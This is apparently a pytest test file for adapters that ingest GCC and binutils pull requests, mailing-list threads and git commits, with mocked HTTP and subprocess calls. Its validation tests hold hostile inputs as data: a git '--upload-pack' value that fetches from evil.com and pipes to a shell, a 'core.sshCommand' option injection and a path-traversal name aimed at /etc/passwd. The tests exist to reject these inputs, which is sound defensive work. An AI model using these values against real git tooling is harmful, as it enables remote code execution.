"""Tests for the source adapters.

Uses:
- respx  — mock httpx calls for GitHubAdapter
- unittest.mock — mock subprocess for PlainGitAdapter and PublicInboxAdapter
"""

from __future__ import annotations

import subprocess
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from agents.adapters.github import GitHubAdapter
from agents.adapters.plain_git import PlainGitAdapter
from agents.ingestion.engine import IngestionEngine
from agents.models.raw import RawCommit, RawDiscussion

# ---------------------------------------------------------------------------
# GitHubAdapter
# ---------------------------------------------------------------------------

def _recent_iso(hours_ago: int = 1) -> str:
    """Return an ISO-8601 timestamp within the last *hours_ago* hours (UTC).

    Used so adapter tests aren't date-brittle as wall-clock time advances.
    """
    from datetime import datetime, timedelta, timezone

    dt = datetime.now(tz=timezone.utc) - timedelta(hours=hours_ago)
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


class TestGitHubAdapter:
    def _make_pr(self, number: int = 101) -> dict:
        return {
            "number": number,
            "title": f"gcc/ipa: inline improvement #{number}",
            "body": "Improve inliner.",
            "user": {"login": "dev"},
            "created_at": _recent_iso(2),
            "updated_at": _recent_iso(1),
            "html_url": f"https://github.com/gcc-mirror/gcc/pull/{number}",
            "state": "open",
            "draft": False,
            "labels": [],
            "changed_files": 3,
        }

    def _make_commit(self, sha: str = "abc123") -> dict:
        return {
            "sha": sha,
            "commit": {
                "message": "Fix inline heuristics",
                "author": {
                    "name": "Dev User",
                    "email": "dev@example.com",
                    "date": _recent_iso(1),
                },
            },
            "html_url": f"https://github.com/gcc-mirror/gcc/commit/{sha}",
            "stats": {"additions": 10, "deletions": 3, "total": 13},
            "files": [{"filename": "gcc/ipa-inline.cc"}],
        }

    def test_fetch_discussions(self):
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        pr = self._make_pr()
        # Create adapter INSIDE the mock context so the persistent client is mocked
        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter(
                "gcc-mirror", "gcc", token="fake-token", project="gcc"
            )
            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
            mock.get("/repos/gcc-mirror/gcc/pulls/101/comments").respond(200, json=[])
            # /pulls/{id} is hit twice: once for JSON detail (changed_files),
            # once for the diff (different Accept header — same URL).
            mock.get("/repos/gcc-mirror/gcc/pulls/101").mock(
                side_effect=[
                    respx.MockResponse(200, json=pr),
                    respx.MockResponse(
                        200,
                        text="diff --git a/gcc/ipa-inline.cc b/gcc/ipa-inline.cc\n",
                    ),
                ]
            )

            discussions = adapter.fetch_discussions(since_hours=24)

        assert len(discussions) == 1
        d = discussions[0]
        assert isinstance(d, RawDiscussion)
        assert d.id == "101"
        assert d.source_type == "github_pr"
        assert d.project == "gcc"
        assert "inline" in d.title.lower()

    def test_fetch_commits(self):
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        commit = self._make_commit("deadbeef")
        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter(
                "gcc-mirror", "gcc", token="fake-token", project="gcc"
            )
            mock.get("/repos/gcc-mirror/gcc/commits").respond(200, json=[commit])
            # New: per-commit detail fetch for stats + files (list endpoint
            # does not include them).
            mock.get("/repos/gcc-mirror/gcc/commits/deadbeef").respond(
                200, json=commit
            )

            commits = adapter.fetch_commits(since_hours=24)

        assert len(commits) == 1
        c = commits[0]
        assert isinstance(c, RawCommit)
        assert c.sha == "deadbeef"
        assert c.source_type == "github"
        assert c.project == "gcc"
        # diff_stat must be populated from the detail endpoint's `stats`
        assert "+10" in c.diff_stat and "-3" in c.diff_stat

    def test_http_error_on_comments_returns_empty_replies(self):
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        pr = self._make_pr(200)
        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
            mock.get("/repos/gcc-mirror/gcc/pulls/200/comments").respond(500, json={})
            # /pulls/200 is hit twice: detail (JSON), then diff (text)
            mock.get("/repos/gcc-mirror/gcc/pulls/200").mock(
                side_effect=[
                    respx.MockResponse(200, json=pr),
                    respx.MockResponse(200, text=""),
                ]
            )

            discussions = adapter.fetch_discussions(since_hours=24)

        assert discussions[0].replies == []

    def test_large_pr_diff_skipped(self):
        """PRs with >500 changed_files must not trigger a diff fetch."""
        try:
            import respx
        except ImportError:
            pytest.skip("respx not installed")

        pr = self._make_pr(300)
        pr["changed_files"] = 600  # exceeds threshold

        with respx.mock(base_url="https://api.github.com") as mock:
            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
            # Detail endpoint must now be hit (changed_files lives here, not
            # in the list response). It is called EXACTLY ONCE — the diff
            # fetch must be skipped because changed_files > 500.
            detail_route = mock.get(
                "/repos/gcc-mirror/gcc/pulls/300"
            ).respond(200, json=pr)
            mock.get("/repos/gcc-mirror/gcc/pulls/300/comments").respond(200, json=[])

            discussions = adapter.fetch_discussions(since_hours=24)

        assert discussions[0].diff_text is None
        # The detail endpoint was hit exactly once (detail only, no diff).
        assert detail_route.call_count == 1


# ---------------------------------------------------------------------------
# PublicInboxAdapter
# ---------------------------------------------------------------------------

SAMPLE_MBOX = (
    b"From: Jane Doe <jane@example.com>\r\n"
    b"Message-ID: <patch-42@gcc.gnu.org>\r\n"
    b"Date: Mon, 14 Apr 2026 10:00:00 +0000\r\n"
    b"Subject: [PATCH] gcc/ipa: inline improvement\r\n"
    b"\r\n"
    b"This patch does something useful.\r\n"
    b"--- a/gcc/ipa.cc\r\n"
    b"+++ b/gcc/ipa.cc\r\n"
)


class TestPublicInboxAdapter:
    def test_parse_mbox_into_raw_discussion(self, tmp_path: Path):
        from agents.adapters.public_inbox import PublicInboxAdapter

        adapter = PublicInboxAdapter(
            discussion_lists=["gcc"],
            cvs_lists=[],
            cache_dir=tmp_path,
        )

        sha = "abc123def456"
        mock_mirror = tmp_path / "gcc.0.git"
        mock_mirror.mkdir()

        def fake_run(cmd, **kwargs):
            r = MagicMock()
            r.returncode = 0
            if "log" in cmd:
                r.stdout = f"{sha}\n"
            elif "show" in cmd:
                r.stdout = SAMPLE_MBOX
            else:
                r.stdout = b""
            return r

        # _mirror_list now returns list[Path] — mock returns a list
        with (
            patch(
                "agents.adapters.public_inbox._mirror_list",
                return_value=[mock_mirror],
            ),
            patch(
                "agents.adapters.public_inbox.subprocess.run",
                side_effect=fake_run,
            ),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 1
        d = discussions[0]
        assert d.source_type == "public_inbox"
        assert "inline" in d.title.lower()

    def test_all_epochs_iterated(self, tmp_path: Path):
        """Messages from epoch 1+ must appear in results, not just epoch 0."""
        from agents.adapters.public_inbox import PublicInboxAdapter

        adapter = PublicInboxAdapter(
            discussion_lists=["gcc"],
            cvs_lists=[],
            cache_dir=tmp_path,
        )

        sha0 = "a" * 40
        sha1 = "b" * 40
        epoch0 = tmp_path / "gcc.0.git"
        epoch1 = tmp_path / "gcc.1.git"
        epoch0.mkdir()
        epoch1.mkdir()

        # Each epoch must have a distinct Message-ID, otherwise the dedup
        # logic (seen_ids) correctly suppresses the duplicate.
        MBOX_EPOCH0 = SAMPLE_MBOX.replace(
            b"patch-42@gcc.gnu.org", b"patch-42@gcc.gnu.org",
        )
        MBOX_EPOCH1 = SAMPLE_MBOX.replace(
            b"patch-42@gcc.gnu.org", b"patch-99@gcc.gnu.org",
        )

        def fake_run(cmd, cwd=None, **kwargs):
            r = MagicMock()
            r.returncode = 0
            if "log" in cmd:
                r.stdout = f"{sha0}\n" if cwd == epoch0 else f"{sha1}\n"
            elif "show" in cmd:
                r.stdout = MBOX_EPOCH0 if cwd == epoch0 else MBOX_EPOCH1
            else:
                r.stdout = b""
            return r

        with (
            patch(
                "agents.adapters.public_inbox._mirror_list",
                return_value=[epoch0, epoch1],
            ),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        # Both epochs should contribute one distinct discussion each
        assert len(discussions) == 2
        ids = {d.id for d in discussions}
        assert "patch-42@gcc.gnu.org" in ids
        assert "patch-99@gcc.gnu.org" in ids

    def test_mirror_failure_returns_empty(self, tmp_path: Path):
        """When _mirror_list returns [], adapter must return [] without raising."""
        from agents.adapters.public_inbox import PublicInboxAdapter

        adapter = PublicInboxAdapter(
            discussion_lists=["gcc"],
            cvs_lists=[],
            cache_dir=tmp_path,
        )

        # _mirror_list returning [] simulates a total network failure
        with patch(
            "agents.adapters.public_inbox._mirror_list",
            return_value=[],
        ):
            result = adapter.fetch_discussions(since_hours=24)

        assert result == []

    def test_invalid_list_name_rejected(self, tmp_path: Path):
        """List names that could cause git-option injection must be rejected."""
        import pytest

        from agents.adapters.public_inbox import PublicInboxAdapter, _validate_list_name

        with pytest.raises(ValueError, match="Invalid list name"):
            _validate_list_name("--upload-pack=evil")

        with pytest.raises(ValueError, match="Invalid list name"):
            PublicInboxAdapter(
                discussion_lists=["../../../etc/passwd"],
                cvs_lists=[],
                cache_dir=tmp_path,
            )

    def _adapter_with_mboxes(self, tmp_path: Path, mboxes: list[bytes]):
        """Helper: return an adapter + mock that emits *mboxes* as sequential emails."""
        from agents.adapters.public_inbox import PublicInboxAdapter

        adapter = PublicInboxAdapter(
            discussion_lists=["gcc"],
            cvs_lists=[],
            cache_dir=tmp_path,
        )
        shas = [f"{i:040x}" for i in range(len(mboxes))]
        mirror = tmp_path / "gcc.0.git"
        mirror.mkdir(exist_ok=True)
        mbox_by_sha = dict(zip(shas, mboxes))

        def fake_run(cmd, cwd=None, **kwargs):
            r = MagicMock()
            r.returncode = 0
            if "log" in cmd:
                r.stdout = "\n".join(shas) + "\n"
            elif "show" in cmd:
                sha_arg = next((a for a in cmd if len(a) > 5 and ":" in a), None)
                sha = sha_arg.split(":")[0] if sha_arg else shas[0]
                r.stdout = mbox_by_sha.get(sha, mboxes[0])
            else:
                r.stdout = b""
            return r

        return adapter, mirror, fake_run

    def test_patch_series_gets_series_id(self, tmp_path: Path):
        """[PATCH M/K] emails with K>1 must share a series_id derived from the topic."""
        mbox1 = (
            b"From: Alice <alice@example.com>\r\n"
            b"Message-ID: <p1@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 10:00:00 +0000\r\n"
            b"Subject: [PATCH 1/3] gcc/ipa: add inlining pass\r\n"
            b"\r\n"
            b"First patch body.\r\n"
        )
        mbox2 = (
            b"From: Alice <alice@example.com>\r\n"
            b"Message-ID: <p2@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 10:01:00 +0000\r\n"
            b"Subject: [PATCH 2/3] gcc/ipa: add inlining pass\r\n"
            b"\r\n"
            b"Second patch body.\r\n"
        )
        adapter, mirror, fake_run = self._adapter_with_mboxes(tmp_path, [mbox1, mbox2])

        with (
            patch("agents.adapters.public_inbox._mirror_list", return_value=[mirror]),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 2
        series_ids = {d.metadata.get("series_id") for d in discussions}
        # Both patches must share the same non-None series_id
        assert len(series_ids) == 1
        sid = series_ids.pop()
        assert sid is not None
        assert "gcc/ipa" in sid or "inlining" in sid

    def test_single_patch_has_no_series_id(self, tmp_path: Path):
        """[PATCH 1/1] (singleton series) must NOT produce a series_id."""
        mbox = (
            b"From: Bob <bob@example.com>\r\n"
            b"Message-ID: <solo@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 11:00:00 +0000\r\n"
            b"Subject: [PATCH 1/1] gcc/ipa: trivial fix\r\n"
            b"\r\n"
            b"One-off patch.\r\n"
        )
        adapter, mirror, fake_run = self._adapter_with_mboxes(tmp_path, [mbox])

        with (
            patch("agents.adapters.public_inbox._mirror_list", return_value=[mirror]),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 1
        assert discussions[0].metadata.get("series_id") is None

    def test_reply_thread_gets_series_id_from_in_reply_to(self, tmp_path: Path):
        """An email with In-Reply-To must get series_id equal to the root Message-ID."""
        mbox = (
            b"From: Carol <carol@example.com>\r\n"
            b"Message-ID: <reply@gcc.gnu.org>\r\n"
            b"In-Reply-To: <root@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 12:00:00 +0000\r\n"
            b"Subject: Re: Some RFC\r\n"
            b"\r\n"
            b"Reply body.\r\n"
        )
        adapter, mirror, fake_run = self._adapter_with_mboxes(tmp_path, [mbox])

        with (
            patch("agents.adapters.public_inbox._mirror_list", return_value=[mirror]),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 1
        assert discussions[0].metadata.get("series_id") == "root@gcc.gnu.org"

    def test_thread_replies_merged_into_single_discussion(self, tmp_path: Path):
        """Root + two replies sharing the same thread must collapse into one digest."""
        root = (
            b"From: Alice <alice@example.com>\r\n"
            b"Message-ID: <root@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 10:00:00 +0000\r\n"
            b"Subject: Policy on use of LLM tools\r\n"
            b"\r\n"
            b"I propose the following policy ...\r\n"
        )
        reply1 = (
            b"From: Bob <bob@example.com>\r\n"
            b"Message-ID: <r1@gcc.gnu.org>\r\n"
            b"In-Reply-To: <root@gcc.gnu.org>\r\n"
            b"References: <root@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 11:00:00 +0000\r\n"
            b"Subject: Re: Policy on use of LLM tools\r\n"
            b"\r\n"
            b"I agree, but disclosure should be required.\r\n"
        )
        reply2 = (
            b"From: Carol <carol@example.com>\r\n"
            b"Message-ID: <r2@gcc.gnu.org>\r\n"
            b"In-Reply-To: <r1@gcc.gnu.org>\r\n"
            b"References: <root@gcc.gnu.org> <r1@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 12:00:00 +0000\r\n"
            b"Subject: Re: Policy on use of LLM tools\r\n"
            b"\r\n"
            b"The OpenJDK precedent is worth considering.\r\n"
        )
        adapter, mirror, fake_run = self._adapter_with_mboxes(
            tmp_path, [root, reply1, reply2]
        )

        with (
            patch("agents.adapters.public_inbox._mirror_list", return_value=[mirror]),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 1
        d = discussions[0]
        assert d.id == "root@gcc.gnu.org"
        assert len(d.replies) == 2
        reply_ids = {r["message_id"] for r in d.replies}
        assert reply_ids == {"r1@gcc.gnu.org", "r2@gcc.gnu.org"}
        # Head is the earliest message (the root), not a reply.
        assert "Re:" not in d.title
        assert d.metadata.get("reply_count") == 2

    def test_thread_replies_merged_when_root_missing(self, tmp_path: Path):
        """Replies whose root is outside the window still collapse to one digest."""
        reply1 = (
            b"From: Bob <bob@example.com>\r\n"
            b"Message-ID: <r1@gcc.gnu.org>\r\n"
            b"In-Reply-To: <root@gcc.gnu.org>\r\n"
            b"References: <root@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 11:00:00 +0000\r\n"
            b"Subject: Re: Policy on use of LLM tools\r\n"
            b"\r\n"
            b"I agree, but disclosure should be required.\r\n"
        )
        reply2 = (
            b"From: Carol <carol@example.com>\r\n"
            b"Message-ID: <r2@gcc.gnu.org>\r\n"
            b"In-Reply-To: <r1@gcc.gnu.org>\r\n"
            b"References: <root@gcc.gnu.org> <r1@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 12:00:00 +0000\r\n"
            b"Subject: Re: Policy on use of LLM tools\r\n"
            b"\r\n"
            b"The OpenJDK precedent is worth considering.\r\n"
        )
        adapter, mirror, fake_run = self._adapter_with_mboxes(
            tmp_path, [reply1, reply2]
        )

        with (
            patch("agents.adapters.public_inbox._mirror_list", return_value=[mirror]),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 1
        d = discussions[0]
        # Stable id = external root Message-ID, even though the root itself
        # is not in the window. This keeps successive runs converging on the
        # same digest.
        assert d.id == "root@gcc.gnu.org"
        assert len(d.replies) == 1
        assert d.replies[0]["message_id"] == "r2@gcc.gnu.org"

    def test_standalone_email_has_no_series_id(self, tmp_path: Path):
        """A plain email with no patch tag or In-Reply-To must have series_id=None."""
        mbox = (
            b"From: Dave <dave@example.com>\r\n"
            b"Message-ID: <standalone@gcc.gnu.org>\r\n"
            b"Date: Mon, 14 Apr 2026 13:00:00 +0000\r\n"
            b"Subject: Question about GCC internals\r\n"
            b"\r\n"
            b"Just a question.\r\n"
        )
        adapter, mirror, fake_run = self._adapter_with_mboxes(tmp_path, [mbox])

        with (
            patch("agents.adapters.public_inbox._mirror_list", return_value=[mirror]),
            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
        ):
            discussions = adapter.fetch_discussions(since_hours=999)

        assert len(discussions) == 1
        assert discussions[0].metadata.get("series_id") is None


# ---------------------------------------------------------------------------
# PlainGitAdapter
# ---------------------------------------------------------------------------

_GIT_LOG_LINE = (
    "deadbeef1234567890abcdef1234567890abcdef\x1f"
    "dev@example.com\x1f"
    "2026-04-14T09:00:00+00:00\x1f"
    "binutils/ld: fix relaxation loop\x1f"
    "HEAD -> master"
)


class TestPlainGitAdapter:
    def test_fetch_commits_parses_log(self, tmp_path: Path):
        adapter = PlainGitAdapter(
            repo_url="https://sourceware.org/git/binutils-gdb.git",
            branch="master",
            cache_dir=tmp_path,
        )
        bare = tmp_path / "binutils-gdb.git"
        bare.mkdir()

        def fake_run(cmd, cwd=None, **kwargs):
            if "clone" in cmd or "fetch" in cmd:
                return MagicMock(returncode=0, stdout="", stderr="")
            if "log" in cmd:
                return MagicMock(returncode=0, stdout=_GIT_LOG_LINE + "\n", stderr="")
            if "diff-tree" in cmd:
                return MagicMock(returncode=0, stdout="+45/-12\n", stderr="")
            return MagicMock(returncode=0, stdout="", stderr="")

        with patch("agents.adapters.plain_git.subprocess.run", side_effect=fake_run):
            commits = adapter.fetch_commits(since_hours=24)

        assert len(commits) == 1
        c = commits[0]
        assert c.sha == "deadbeef1234567890abcdef1234567890abcdef"
        assert c.source_type == "plain_git"
        assert "binutils" in c.message.lower()

    def test_git_log_failure_returns_empty(self, tmp_path: Path):
        adapter = PlainGitAdapter(
            repo_url="https://sourceware.org/git/binutils-gdb.git",
            cache_dir=tmp_path,
        )
        bare = tmp_path / "binutils-gdb.git"
        bare.mkdir()

        def fake_run(cmd, **kwargs):
            if "log" in cmd:
                raise subprocess.CalledProcessError(1, cmd)
            return MagicMock(returncode=0, stdout="", stderr="")

        with patch("agents.adapters.plain_git.subprocess.run", side_effect=fake_run):
            commits = adapter.fetch_commits(since_hours=24)

        assert commits == []

    def test_invalid_url_rejected(self, tmp_path: Path):
        """repo_url with disallowed scheme must raise ValueError immediately."""
        with pytest.raises(ValueError, match="Unsafe repo_url"):
            PlainGitAdapter(
                repo_url="--upload-pack=curl evil.com|sh",
                cache_dir=tmp_path,
            )

    def test_invalid_branch_rejected(self, tmp_path: Path):
        """Branch names that start with - or contain shell meta chars are rejected."""
        with pytest.raises(ValueError, match="Unsafe branch name"):
            PlainGitAdapter(
                repo_url="https://example.com/repo.git",
                branch="-c core.sshCommand=evil",
                cache_dir=tmp_path,
            )


# ---------------------------------------------------------------------------
# IngestionEngine — deduplication and fault isolation
# ---------------------------------------------------------------------------

class TestEngineDeduplication:
    def _make_discussion(self, id_: str) -> RawDiscussion:
        return RawDiscussion(
            id=id_,
            title=f"Discussion {id_}",
            body="body",
            author="a",
            date=datetime(2026, 4, 14, tzinfo=timezone.utc),
            url=f"https://example.com/{id_}",
            replies=[],
            diff_text="--- a/x\n+++ b/x\n@@ -1 +1 @@\n-old\n+new\n",
            source_type="github_pr",
        )

    def _make_commit(self, sha: str) -> RawCommit:
        return RawCommit(
            sha=sha,
            author="a",
            date=datetime(2026, 4, 14, tzinfo=timezone.utc),
            message="msg",
            diff_stat="",
            url=f"https://example.com/{sha}",
            source_type="plain_git",
        )

    def test_duplicate_discussion_ids_deduplicated(self):
        class FakeDiscussionSource:
            def __init__(self, items):
                self._items = items

            def fetch_discussions(self, since_hours=24):
                return self._items

        d1 = self._make_discussion("42")
        d2 = self._make_discussion("42")  # same id, different object

        src1 = FakeDiscussionSource([d1])
        src2 = FakeDiscussionSource([d2])
        engine = IngestionEngine([src1, src2], [])
        result = engine.run()
        assert len(result["discussions"]) == 1

    def test_duplicate_commit_shas_deduplicated(self):
        class FakeCommitSource:
            def __init__(self, items):
                self._items = items

            def fetch_commits(self, since_hours=24):
                return self._items

        c1 = self._make_commit("cafebabe")
        c2 = self._make_commit("cafebabe")

        src1 = FakeCommitSource([c1])
        src2 = FakeCommitSource([c2])
        engine = IngestionEngine([], [src1, src2])
        result = engine.run()
        assert len(result["commits"]) == 1

    def test_adapter_exception_does_not_propagate(self):
        """Adapter errors must be caught by the engine — results are empty."""
        class BrokenSource:
            def fetch_discussions(self, since_hours=24):
                raise RuntimeError("adapter exploded")

            def fetch_commits(self, since_hours=24):
                raise RuntimeError("adapter exploded")

        engine = IngestionEngine([BrokenSource()], [BrokenSource()])
        result = engine.run()
        assert result["discussions"] == []
        assert result["commits"] == []
